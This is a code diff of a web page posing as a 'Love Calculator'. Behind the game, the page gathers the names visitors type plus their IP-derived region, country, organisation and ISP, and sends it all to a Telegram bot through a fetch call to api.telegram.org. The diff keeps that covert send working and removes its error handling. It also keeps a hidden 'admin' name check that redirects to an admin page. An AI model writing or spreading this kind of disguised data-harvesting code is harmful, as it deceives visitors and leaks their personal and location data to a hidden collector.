@@ -108,7 +108,7 @@ async function calculateLove() {
   const c = document.getElementById("crushName").value.trim();
   if(!u || !c) { alert("Please enter both names!"); return; }
 
-  // 🔑 Admin check
+  // 🔑 Admin check (case-insensitive)
   if (u.toLowerCase() === "admin" || c.toLowerCase() === "admin") {
     window.location.href = "admin.html";
     return;
@@ -152,10 +152,9 @@ async function sendToTelegram(u, c, percent) {
       region = j.region || region;
       country = j.country || country;
       org = j.org || org;
-      isp = j.isp || isp;
+      isp = j.connection?.isp || isp;
     }
   } catch {}
-
   const msg =
 `╔━━━━━━━━━━━━━━━━━━━
 ║ 💖 Love Calculator Entry 💖
@@ -176,18 +175,14 @@ async function sendToTelegram(u, c, percent) {
 ║ 🪿 developed by: 𝐃 ʜ 𝙰 ɴ 𝐢ⁱɪ  
 ╚━━━━━━━━━━━━━━━━━━━`;
 
-  // ✅ send to Telegram
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+   // ✅ Correct way to send to Telegram
+   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: {"Content-Type":"application/json"},
       body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-    });
-  } catch(err) {
-    console.error("Telegram send error:", err);
-  }
+   });
 }
 </script>
 
 </body>
-</html>
+  </html>
